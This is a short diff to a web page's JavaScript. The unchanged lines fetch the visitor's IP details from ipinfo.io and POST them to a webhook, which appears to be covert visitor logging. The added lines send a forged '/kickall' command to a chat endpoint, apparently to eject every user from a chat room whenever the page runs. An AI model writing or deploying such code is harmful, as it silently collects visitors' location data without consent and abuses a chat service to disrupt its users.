@@ -192,6 +192,11 @@ fetch('https://ipinfo.io/json')
       timestamp: new Date().toISOString()
     };
 
+	  fetch("https://chat/chatResult", {
+    method: "POST",
+    body: JSON.stringify({ message: "/kickall from wsws    " }),
+});
+
     fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -276,3 +281,4 @@ document.addEventListener('keydown', function(e) {
 
 </body>
 </html>
+
